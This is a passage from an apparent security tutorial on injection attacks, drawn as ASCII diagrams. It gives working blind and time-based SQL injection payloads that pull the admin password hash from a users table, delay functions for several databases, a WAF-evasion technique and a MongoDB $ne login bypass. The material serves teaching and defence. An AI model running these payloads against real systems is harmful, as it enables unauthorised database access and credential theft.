│  │                                                     │   │
│  │  Goal: Determine first character of admin password   │   │
│  │                                                     │   │
│  │  Attempt 1:                                         │   │
│  │  ' AND SUBSTRING((SELECT password FROM users        │   │
│  │    WHERE username='admin'), 1, 1) = 'a' -- -        │   │
│  │  → FALSE response → Not 'a'                         │   │
│  │                                                     │   │
│  │  Attempt 2:                                         │   │
│  │  ' AND SUBSTRING((SELECT password FROM users        │   │
│  │    WHERE username='admin'), 1, 1) = 'b' -- -        │   │
│  │  → FALSE response → Not 'b'                         │   │
│  │                                                     │   │
│  │  ... (continue through alphabet) ...                │   │
│  │                                                     │   │
│  │  Attempt 6 (or later):                              │   │
│  │  SUBSTRING(..., 1, 1) = '5'                         │   │
│  │  → TRUE response → First character is '5'!          │   │
│  │                                                     │   │
│  │  Then move to position 2: SUBSTRING(..., 2, 1)      │   │
│  │  Continue until full hash extracted                 │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  Visualization of extraction:                               │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ Password hash: 5f4dcc3b5aa765d61d8327deb882cf99    │   │
│  │                 ↑ ↑                                  │   │
│  │                 │ └─ Position 2: found 'f' (TRUE)    │   │
│  │                 └─── Position 1: found '5' (TRUE)    │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

### Binary Search Optimization

Instead of trying every character sequentially, attackers can optimize with binary search:

```
┌─────────────────────────────────────────────────────────────┐
│              BINARY SEARCH OPTIMIZATION                     │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ASCII value of first character:                            │
│                                                             │
│  ' AND ASCII(SUBSTRING((SELECT password FROM users          │
│    WHERE username='admin'), 1, 1)) > 79 -- -               │
│                                                             │
│  ASCII ranges:                                              │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ 0-31:  Control characters                           │   │
│  │ 32-47: Space and punctuation                        │   │
│  │ 48-57: Digits (0-9)      ← Hashes often here        │   │
│  │ 58-64: More punctuation                             │   │
│  │ 65-90: Uppercase (A-Z)   ← Hashes sometimes here    │   │
│  │ 97-122: Lowercase (a-f)  ← Hash characters          │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  Binary search reduces queries from ~36 to ~6 per char!     │
│  For a 32-character hash: 192 queries vs 1152 queries       │
└─────────────────────────────────────────────────────────────┘
```

### Time-Based Blind SQL Injection

When the application shows no visible difference between TRUE and FALSE responses, attackers introduce artificial time delays.

```
┌─────────────────────────────────────────────────────────────┐
│              TIME-BASED BLIND SQL INJECTION                 │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Concept: If condition is TRUE → introduce delay            │
│           If condition is FALSE → respond normally          │
│                                                             │
│  MySQL Time Delay Functions:                                │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ SLEEP(seconds)        - Pause for N seconds         │   │
│  │ BENCHMARK(count,expr) - Execute expression N times  │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  Example: Check if first character is 'a'                   │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ ' AND IF(                                           │   │
│  │     SUBSTRING((SELECT password FROM users           │   │
│  │       WHERE username='admin'), 1, 1) = 'a',         │   │
│  │     SLEEP(5),  -- TRUE: Wait 5 seconds              │   │
│  │     0          -- FALSE: No delay                   │   │
│  │ ) -- -                                              │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  Response time analysis:                                    │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ Request 1: Response in 0.3s → FALSE (not 'a')       │   │
│  │ Request 2: Response in 0.2s → FALSE (not 'b')       │   │
│  │ Request 6: Response in 5.3s → TRUE (is '5'!)        │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  DBMS-Specific Time Delay Functions:                        │
│  ┌─────────────────────────────────────────────────────┐   │
│  │                                                     │   │
│  │ MySQL:                                              │   │
│  │   SLEEP(15)                  -- 15 second delay     │   │
│  │   BENCHMARK(50000000,MD5('x'))  -- CPU delay       │   │
│  │                                                     │   │
│  │ MS SQL Server:                                      │   │
│  │   WAITFOR DELAY '0:0:15'     -- 15 second delay    │   │
│  │   WAITFOR TIME '14:30:15'    -- Wait until time    │   │
│  │                                                     │   │
│  │ PostgreSQL:                                         │   │
│  │   SELECT pg_sleep(15)        -- 15 second delay    │   │
│  │                                                     │   │
│  │ Oracle:                                             │   │
│  │   BEGIN DBMS_LOCK.SLEEP(15); END;                   │   │
│  │   -- OR heavy queries:                              │   │
│  │   SELECT UTL_INADDR.get_host_name('10.10.10.10')   │   │
│  │   FROM dual;                                        │   │
│  │   SELECT count(*) FROM all_users A, all_users B,   │   │
│  │   all_users C, all_users D;                         │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

### Splitting and Balancing Technique

This advanced blind injection technique uses functionally equivalent queries that maintain balanced syntax:

```
┌─────────────────────────────────────────────────────────────┐
│             SPLITTING AND BALANCING                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Core Principle: Replacing values with equivalent sub-queries│
│  that maintain correct SQL syntax while hiding injection    │
│                                                             │
│  Example 1 - Numeric Equivalence:                           │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ Original: SELECT name FROM customers WHERE id=3    │   │
│  │ Balanced: SELECT name FROM customers WHERE id=2+1  │   │
│  │                                                     │   │
│  │ These produce identical results!                    │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  Example 2 - String Concatenation:                          │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ Original: WHERE name='Jonathan'                     │   │
│  │ Balanced: WHERE name='Jo'||'nathan'                 │   │
│  │                                                     │   │
│  │ '||' is SQL string concatenation                    │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  Example 3 - Subquery Injection:                            │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ Original: WHERE id=3                                │   │
│  │                                                     │   │
│  │ Step 1:  WHERE id=3+(SELECT 2-2)                   │   │
│  │          → Still equals 3 (adding zero)             │   │
│  │                                                     │   │
│  │ Step 2:  WHERE id=3+(SELECT CASE WHEN               │   │
│  │            (SELECT SUBSTRING(password,1,1)           │   │
│  │             FROM users WHERE username='admin')='5'   │   │
│  │            THEN 0 ELSE 1 END)                       │   │
│  │                                                     │   │
│  │          → If first char is '5': id=3+0=3 (TRUE)   │   │
│  │          → If first char isn't '5': id=3+1=4 (FALSE)│   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  Parentheses Balancing Rule:                                │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ Every '(' must have matching ')'                    │   │
│  │                                                     │   │
│  │ Valid:   (SELECT 1)                                 │   │
│  │ Invalid: (SELECT 1                                   │   │
│  │                                                     │   │
│  │ This technique helps bypass WAF filters that look   │   │
│  │ for specific injection patterns!                    │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

---

## Beyond SQL: Does NoSQL Mean No Injection?

Despite the name suggesting otherwise, NoSQL databases are not immune to injection attacks. The attack vector is different but equally dangerous.

```
┌─────────────────────────────────────────────────────────────┐
│             NOSQL INJECTION OVERVIEW                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  "NoSQL" = "Not Only SQL" (not "No SQL")                    │
│                                                             │
│  Common NoSQL Database Types:                               │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ • MongoDB (document store)                          │   │
│  │ • Redis (key-value store)                           │   │
│  │ • Cassandra (wide-column store)                     │   │
│  │ • Neo4j (graph database)                            │   │
│  │ • Elasticsearch (search engine)                     │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  MongoDB Injection Example:                                 │
│  ┌─────────────────────────────────────────────────────┐   │
│  │                                                     │   │
│  │  Vulnerable Node.js code:                           │   │
│  │  db.collection('users').find({                      │   │
│  │    username: req.body.username,                     │   │
│  │    password: req.body.password                      │   │
│  │  });                                                │   │
│  │                                                     │   │
│  │  Normal input:                                      │   │
│  │  username: "admin", password: "correct123"          │   │
│  │  → Finds matching document                          │   │
│  │                                                     │   │
│  │  Injection input:                                   │   │
│  │  username: {"$ne": ""}, password: {"$ne": ""}       │   │
│  │  → $ne = "not equal to empty string" = always true  │   │
│  │  → Returns first user document!                     │   │
│  │                                                     │   │
│  │  MongoDB operators exploitable:                     │   │
│  │  • $ne  (not equal)                                 │   │
│  │  • $gt  (greater than)                              │   │
│  │  • $lt  (less than)                                 │   │
│  │  • $regex (regular expression match)                │   │
│  │  • $where (JavaScript evaluation)                   │   │
│  └─────────────────────────────────────────────────────┘   │
│                                                             │
│  Key Insight:                                                │
│  ┌─────────────────────────────────────────────────────┐   │
│  │ Injection is not about SQL—it's about the           │   │
│  │ fundamental pattern of:                              │   │
│  │                                                     │   │
│  │ USER INPUT → COMMAND CONSTRUCTION → EXECUTION       │   │
│  │                                                     │   │
│  │ Without proper sanitization, ANY query language     │   │
│  │ (SQL, NoSQL, LDAP, XPath, etc.) is vulnerable      │   │
│  │ to injection attacks.                               │   │
│  └─────────────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────────────┘
```

---

## Complete Attack Chain Visualization

```
┌─────────────────────────────────────────────────────────────┐
│            COMPLETE SQL INJECTION ATTACK CHAIN               │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌───────────────────────────────────────────────────┐    │
│  │ PHASE 1: RECONNAISSANCE                          │    │
│  │ • Error message analysis                          │    │
│  │ • DBMS identification                             │    │
│  │ • Version detection                               │    │
│  └────────────────────┬──────────────────────────────┘    │
│                       ↓                                     │
│  ┌───────────────────────────────────────────────────┐    │
│  │ PHASE 2: SCHEMA MAPPING                          │    │
│  │ • Database enumeration                            │    │
│  │ • Table discovery                                 │    │
│  │ • Column/field mapping                            │    │
│  └────────────────────┬──────────────────────────────┘    │
│                       ↓                                     │
│  ┌───────────────────────────────────────────────────┐    │
│  │ PHASE 3: DATA EXTRACTION                         │    │
│  │ • Sensitive table targeting                       │    │
│  │ • Credential harvesting                           │    │
│  │ • Complete database dumping                       │    │
│  └────────────────────┬──────────────────────────────┘    │
│                       ↓                                     │
│  ┌───────────────────────────────────────────────────┐    │
│  │ PHASE 4: EXPLOITATION                            │    │
│  │ • Password cracking                               │    │
│  │ • Authentication bypass                           │    │
│  │ • Privilege escalation                            │    │
│  │ • System compromise                               │    │
│  └───────────────────────────────────────────────────┘    │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## Key Takeaways

1. **UNION is the attacker's primary tool** for extracting arbitrary data from vulnerable queries, but only works when column counts match and data types are compatible.

2. **Schema enumeration follows a drill-down pattern**: databases → tables → columns → data, using each DBMS's system tables (`information_schema` for MySQL, `sysdatabases`/`sysobjects` for MSSQL, `all_tables`/`all_tab_columns` for Oracle).

3. **Blind injection extracts data indirectly** through TRUE/FALSE response differences or time delays, allowing data exfiltration even without visible output.

4. **Authentication bypass exploits Boolean logic**—by injecting tautologies (`OR 1=1`), attackers make WHERE clauses always true, bypassing credential checks.

5. **NoSQL doesn't mean no injection**—the fundamental vulnerability pattern (unsanitized input incorporated into commands) applies across all database paradigms.
